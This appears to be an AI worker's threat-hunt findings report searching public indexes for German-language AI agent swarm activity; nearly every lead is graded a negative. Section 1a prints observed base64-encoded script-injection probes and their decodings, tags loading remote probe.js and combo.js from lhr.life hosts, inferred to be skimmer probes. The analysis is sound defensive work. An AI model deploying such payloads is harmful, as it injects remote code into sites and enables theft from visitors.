# DE-LINGUIST — German Hunt Worker Findings (2026-10-05)

**Worker:** de-linguist (EUROSWARM German-language hunt)
**Task:** close the OPEN items from german-hunt FINDINGS2 (429-blocked urlquery queries + hourly
time-blast analysis), GitHub code search for German agentness, German-language agent boards/wikis.
**Method:** public indexes only — urlquery keyless htmx endpoint (`/api/htmx/search/`, documented in
`~/workspace/skills/urlquery/SKILL.md` tooling), web search snippets. No fetches of candidate
infrastructure, no auth, no exploitation.
**Prior state:** german-hunt/FINDINGS.md + FINDINGS2.md — ~40+ urlquery pivots, all clean negatives;
german-archaeologist/FINDINGS.md — no undocumented German incident in own corpora (all German traces =
the KNOWN wikiservice.at incident, Reuters Sep 4 2026). The KNOWN incident is NOT re-reported here.

**EVIDENCE RULE:** full observed values, never redacted. OBSERVED is separated from INFERENCE throughout.

---

## 1. urlquery OPEN-query sweep (htmx endpoint, 65s pacing, 2026-10-05 15:19–15:30 UTC)

All 8 queries completed — **zero 429s** (rate limit was not hit this session). Raw JSON per query in `raw/`
(`q1..q8`), sweep log `raw/sweep_20261005T151936Z.log`, runner `run_sweep.sh`.

| # | Query | Hits | Verdict |
|---|---|---|---|
| 1 | `httpbun aufgabe` | 0 | **HONEST NEGATIVE** — the fleet's actual carrier × the German task-word; clean zero. |
| 2 | `httpbun agent` | 17 | **HONEST NEGATIVE** (see breakdown) — no German-language agent program on the carrier. |
| 3 | `claude httpbun` | 0 | **HONEST NEGATIVE** — no false-flag-labeled traffic on the carrier. |
| 4 | `uqscan berlin` | 0 | **HONEST NEGATIVE** — Tencent-fleet `uqscan=` marker absent in Berlin contexts. |
| 5 | `sub_poi_navi berlin` | 0 | **HONEST NEGATIVE** — fleet-exclusive `sub_poi_navi` marker absent in Berlin contexts. |
| 6 | `url.domain:linkvertise.com` | 56 | **HONEST NEGATIVE** — no burst (see hourly analysis). |
| 7 | `url.domain:deepl.com` | 21 | **HONEST NEGATIVE** — no burst (see hourly analysis). |
| 8 | `httpbun ergebnis` | 0 | **HONEST NEGATIVE** — carrier × German "result" word; clean zero. |

### 1a. `httpbun agent` — the 17 hits, graded (OBSERVED, full values)

Two clusters, neither German nor agent-shaped:

1. **Skimmer-probe scans via translate.goog (4×, 2026-10-04/05):**
   - `2026-10-05T14:40:00Z 2b6b941f-4409-4bb6-a9f4-8d2ae14727f2 httpbun-com.translate.goog/base64/PGJvZHkgaWQ9eD48c2NyaXB0IHNyYz0vL2EyMzcyZjZlMDkyZTFmLmxoci5saWZlL3Byb2JlLmpzPjwvc2NyaXB0Pg%3D%3D` — base64 decodes to `<body id=x><script src=//a2372f6e092e1f.lhr.life/probe.js></script>`
   - `2026-10-04T17:39:00Z 10ab12df-0a18-4c9d-a86e-79469ab559a7 httpbun-com.translate.goog/base64/PHNjcmlwdCBzcmM9Imh0dHBzOi8vYTIzNzJmNmUwOTJlMWYubGhyLmxpZmUvcHJvYmUuanMiPjwvc2NyaXB0Pgo%3D?_x_tr...` — decodes to `<script src="https://a2372f6e092e1f.lhr.life/probe.js"></script>`
   - `2026-10-04T16:32:00Z 9cdc930c-5a8c-41e7-aeb2-6f99b0d1dcd5 httpbun-com.translate.goog/base64/PHNjcmlwdCBzcmM9Imh0dHBzOi8vYTIzNzJmNmUwOTJlMWYubGhyLmxpZmUvY29tYm8uanMiPjwvc2NyaXB0Pgo%3D?_x_tr...` — decodes to `<script src="https://a2372f6e092e1f.lhr.life/combo.js"></script>`
   - `2026-10-04T16:23:00Z c4ed2904-74e6-4c22-ad0e-19105bcb2628 httpbun-com.translate.goog/base64/PHNjcmlwdCBzcmM9Imh0dHBzOi8vMmNkMGM3OWUyMTIyYWUubGhyLmxpZmUvcHJvYmUuanMiPjwvc2NyaXB0Pgo%3D?_x_tr...` — decodes to `<script src="https://2cd0c79e2122ae.lhr.life/probe.js"></script>`
   - INFERENCE: Magecart-style skimmer probes (lhr.life = LifeHosting-style bulletproof host) being scanned through httpbun via translate.goog. The "agent" match is keyword noise (page content), not an agent program.
2. **Jun-21 short-link cluster (13×, 2026-06-21 02:58–21:00):**
   - `2026-06-21T21:00:00Z 31b603f8-a1ec-465b-b2dc-eb5cf178c439 httpbun-com.translate.goog/base64/PHNjcmlwdD5kb2N1bWVudC50aXRsZT0nVFJBTlNMQVRFJzwvc2NyaXB0Pg%3D%3D?_x_tr_sl=auto&_x_tr_tl=en&_x_tr...` — decodes to `<script>document.title='TRANSLADE'</script>`
   - 12× is.gd short links (`is.gd/eZD1hT` 6×, `is.gd/yPEGdH` 5×, `is.gd/ddgGDV` 1×), report IDs 7b60eea0-..., spread 02:58–20:49 UTC.
   - INFERENCE: short-link scan session, no German markers, no agent markers. A 5-in-12-minutes micro-cluster (02:58–03:10) is scanner behavior, not a fleet burst.
- **Cross-lane note (LEAD for other lanes, not German):** the lhr.life `probe.js`/`combo.js` skimmer-probe cluster on `httpbun-com.translate.goog` (Oct 4–5) is a NEW crimeware-shaped cluster on the fleet's carrier. Not German, not agents — logged here only as observed; relevant lanes (chinese-amap-fleet / crimeware) may want it.

### 1b. Hourly time-blast analysis (OBSERVED — the OPEN item from FINDINGS2)

**linkvertise.com (56 hits, 45 distinct hours, max 6 in one hour — 2026-01-05T20):**
top URL shapes: `linkvertise.com` homepage 19×, `linkvertise.com/access/2594564/ms3xE7MVP5wv` 6×,
`publisher.linkvertise.com/ac/80814` 2×, `linkvertise.com/95680/tb5?o=sharing` 2×, profile pages
(`linkvertise.com/profile/1285252` 2026-10-01T02:58, `linkvertise.com/profile/161166` 2026-09-27T09:59).
Verdict: **HONEST NEGATIVE** — no burst. A fleet burst is dozens of reports in a single hour/day; 56 hits
spread over 45 hours with a max of 6/hr is routine monetized-link scanning, not agent fleet activity.

**deepl.com (21 hits, 13 distinct hours, max 4 in one hour — 2026-05-22T21):**
top URL shapes: `deepl.com` 4×, `www.deepl.com` 4×, `appdownload.deepl.com` 3× (incl.
`appdownload.deepl.com/windows/0install/DeepLSetup.exe` 2× — the 21:00–22:00 May-22 cluster is an
installer-download session), `feature-flagging.deepl.com` 2×, `gtm.deepl.com` 2×.
Verdict: **HONEST NEGATIVE** — no burst, and critically: deepl is NOT used as a fetch-proxy relay
(unlike fanyi.baidu.com/transpage in the Chinese fleet). Homepage scans + app downloads only.

---

## 2. GitHub — German agentness in agent tooling (browser_search, site:github.com)

**OBSERVED repositories (verbatim titles/paths from search results):**

| Repo / file | Observed German content |
|---|---|
| `macstenk/skills` — `AGENTS.md` | "Werkzeuge für KI-Agenten, auf Deutsch. Jedes davon löst eine Aufgabe, die im eigenen Alltag oft genug wiederkehrt, dass sie eine Anleitung verdient." Installable via `npx skills add MacStenk/skills`. Instruction text in German, `description` bilingual German-then-English, `name` stays technical. |
| `andrezakm/kurswoche3` — `.claude/skills/kurs-marketing/SKILL.md`, `.claude/skills/kurs/SKILL.md` | German-language educational skills (marketing course, week 3): "Fünf Stufen, eine Aufgabe", "Präsentiere immer einen Schritt auf einmal", correct umlauts required (ä, ö, ü, ß — no ASCII substitutions). |
| `cygnusb/claude-fuer-deutsches-recht` — `corporate-kanzlei/skills/ki-governance-berufsrecht/SKILL.md`, `AGENTS.md` | German law-firm agent skills (KI-Governance/Berufsrecht, BRAO, EU AI Act). Bilingual test-file disclaimer. |
| `tripitest-art/sc-digger` — `skills/sc-digger-worker/SKILL.md`, `skills/sc-digger-planner/SKILL.md` | German MCP worker/planner skills for a coding agent: "Worker-Aufgabe", "Führe jeden Schritt als Werkzeugaufruf aus", labels `bereit`/`in-arbeit`/`blockiert`. |
| `wadoekeani/browser-agent` — `README.de.md` | German README for a browser-agent extension: "Werkzeuge: Seite lesen, klicken, tippen…", "jede Aufgabe stoppt nach 30 Werkzeugschritten", 15 UI languages. |
| `agentiloop/agent` — `README_de.md` | German README for an agent desktop app: "Aufgabe starten · ⌘ . / Esc abbrechen", "/clear [log\|all\|llm\|history\|tasks\|tokens]", comparison vs Claude Code/Cursor/Cline/OpenClaw. PolyForm Noncommercial license. |
| `humanobmann/skillbibliothek` — `references/AGENTS.md` | German canonical agent-skills library for "autonome KI-Agenten (Codex, Claude Code, Cursor, Open Agent Runtimes)": Fachskills + Control Plane + Execution Plane. |
| `thomasschmiegelt/ai_framework` — `CLAUDE.md` | German agent harness with "Autonomer Coding-Agent (Agent-Harness, 🤖 Agent)": SSE endpoint `POST /api/code/agent`, eigener Werkzeug-Loop with `list_files`/`read_file`/`write_file`/`run_python`, iterates to `max_steps`. |
| `toqsick/my-agent-tools` — `library/yuno-user-preferences/SKILL.md` etc. | German agent workflow skills ("Werkstatt-Tag-Modus: IST → SOLL → Gap → Edits", subagent orchestration "Queen/Biene" pattern). |
| `simeon-kepp/hermes-agent-bundle` — `skills/rfi-irfos/rfi-irfos-deterministic-report-pipeline/SKILL.md` | German-columned pipeline table: `| Step | Werkzeug | Aufgabe |`. **Note:** Hermes is the user's own hackathon ecosystem — human-authored by a fellow contributor, not a swarm trace. |

**INFERENCE / grading:**
- **LEAD (tooling surface, not swarm):** there IS a growing, recently-updated German-language agent-tooling
  ecosystem on GitHub — skills collections (`macstenk/skills`, `humanobmann/skillbibliothek`), full German
  READMEs (`agentiloop/agent`), German worker harnesses (`thomasschmiegelt/ai_framework`, `sc-digger`).
  All observed artifacts are **human-authored tooling** (courses, law-firm skills, READMEs). None show
  agent-written swarm traces, agent coordination markers, or unattributed agent activity.
- **HONEST NEGATIVE (swarm):** no repo found shows German-worded agent programs at runtime, German self-labels
  co-occurring with agent markers, or any swarm-shaped activity. A German-lab fleet running German-worded
  tasks would leave German-language agent output somewhere — the search index shows only German-language
  human tooling.

---

## 3. German-language agent boards / coordination wikis (web search)

**OBSERVED:**
- The placeholder fingerprint `"Beschreibe hier die neue Seite."` (archaeologist's fingerprint) returns only
  **human wikis** in the search index: `theoriekultur.at/wiki?TestSeite`, `dorfwiki.org` (DorfWiki community,
  NOT the wikiservice.at incident farm), `wikiweb.at` RecentChanges (2016-era edits), `prowiki.org`
  WikiServiceAt page (the farm's own site), OpenCms/TYPO3 training PDFs. **No agent-created page carrying the
  placeholder on a non-wikiservice.at wiki.** → **HONEST NEGATIVE** for a new German-locale agent trace.
  (Careful: `dorfwiki.org` ≠ wikiservice.at's `dorfwiki` — dorfwiki.org is Franz Nahrada's human community
  wiki; its placeholder hits are human pages.)
- **No German-language equivalent of public-board.com found.** The only agent-for-agent forum surface in
  German search results is **Moltbook** (moltbook.ai) — designed product, English-language UI, "Reddit for AI
  agents" built on OpenClaw by Austrian developer Peter Steinberger (renamed from Clawdbot/Moltbot; Jan 2026;
  ~150,000 agents per German press). It is a human-built platform, not a covert swarm — and not German-language.
- German press on agent swarms (it-boltwise.de, borncity.com, ad-hoc-news.de, appdated.de, ms-aktuell.de,
  oliverjessner.at) covers **only the KNOWN incidents**: DseWiki ~18,000 posts ("Nightingale Collective"
  researchers: Sydney Von Arx, Cormac Slade Byrd, Spencer Kitts, Thomas Larsen), HF ~700 agents / ~1,200 with
  70,000 messages (METR + Redwood). **No NEW German swarm incident appears in German press.** → HONEST NEGATIVE.
- `warnung.bund.de` (archaeologist's best live lead): not queried this session — remains open for the live lane.

---

## 4. Grading summary

| Lead | Grade | Basis |
|---|---|---|
| `httpbun aufgabe` / `httpbun ergebnis` (fleet carrier × German task/result words) | **HONEST NEGATIVE** | 0 hits both |
| `claude httpbun` (false-flag labels on carrier) | **HONEST NEGATIVE** | 0 hits |
| `uqscan berlin` / `sub_poi_navi berlin` (cross-swarm markers in German contexts) | **HONEST NEGATIVE** | 0 hits both — the Tencent-fleet markers remain fleet-exclusive |
| `httpbun agent` (17 hits) | **HONEST NEGATIVE** | skimmer-probe scans + is.gd short-link cluster; keyword noise, no German content, no agent programs |
| linkvertise.com / deepl.com hourly blast analysis | **HONEST NEGATIVE** | 56 hits/45h (max 6/h), 21 hits/13h (max 4/h) — routine scans, no fleet burst |
| German agentness words × `httpbin` (completed in FINDINGS2) | **HONEST NEGATIVE** | noise-only / zeros |
| German-worded agent programs anywhere in public index | **HONEST NEGATIVE** | only human-authored German tooling |
| German-language agent coordination boards | **HONEST NEGATIVE** | no German public-board.com analog; Moltbook is a human product, English UI |
| `Beschreibe hier die neue Seite.` on non-wikiservice.at wiki | **HONEST NEGATIVE** | human wikis only |
| New German swarm incident in German press | **HONEST NEGATIVE** | all coverage = KNOWN incidents |
| German-language agent TOOLING ecosystem | **LEAD** (tooling, not swarm) | `macstenk/skills`, `humanobmann/skillbibliothek`, `agentiloop/agent` README_de, `sc-digger` worker skills — recent, active, human-authored |
| lhr.life skimmer-probe cluster on `httpbun-com.translate.goog` (Oct 4–5) | **LEAD** (other lanes) | new crimeware-shaped cluster on the fleet's carrier — logged for chinese-amap-fleet/crimeware lanes, NOT German, NOT agents |

---

## 5. Open items

**All assigned OPEN items are now CLOSED (this session, no 429s):**
- `httpbun aufgabe`, `httpbun agent`, `claude httpbun`, `uqscan berlin`, `sub_poi_navi berlin` — all resolved.
- Hourly blast analysis of `linkvertise.com` (56) and `deepl.com` (21) — completed in §1b.

**Still open (out of this worker's brief, or never in it):**
1. `warnung.bund.de` urlquery pull — archaeologist's singleton lead, still unqueried by any lane.
2. The German agent-tooling repos (e.g. `macstenk/skills` description-field grammar, bilingual skill discovery)
   are a legitimate NEW surface for future agent-trace hunts: if a German agent fleet ever self-labels in
   German, German-indexed skill descriptions are where its tooling would surface.
3. The lhr.life `probe.js`/`combo.js` cluster (Oct 4–5, on `httpbun-com.translate.goog`) is a live crimeware-shaped
   cluster on the fleet's carrier — handed to the relevant lanes in §1a; no German connection found.

---

## Raw evidence

- Sweep script: `~/workspace/silent-locus/data/2026-09-28-chinese-amap-fleet/german-french-swarm-hunt/workers/de-linguist/run_sweep.sh`
- Raw JSON + err per query + sweep log: `.../de-linguist/raw/`
- Prior lane state: `~/workspace/silent-locus/data/2026-09-28-chinese-amap-fleet/german-hunt/FINDINGS.md`, `FINDINGS2.md`
- Archaeologist fingerprint: `~/workspace/silent-locus/data/2026-09-28-chinese-amap-fleet/personas/german-archaeologist/FINDINGS.md`

## Undocumented endpoints found this session

None new — the sweep used the already-documented keyless htmx endpoint `GET https://urlquery.net/api/htmx/search/?q=<query>&limit=<n>&offset=<n>` (headers `HX-Request: true`, `HX-Current-URL`), as wrapped by `~/workspace/skills/urlquery/bin/uq_htmx.py`. No new endpoints discovered.
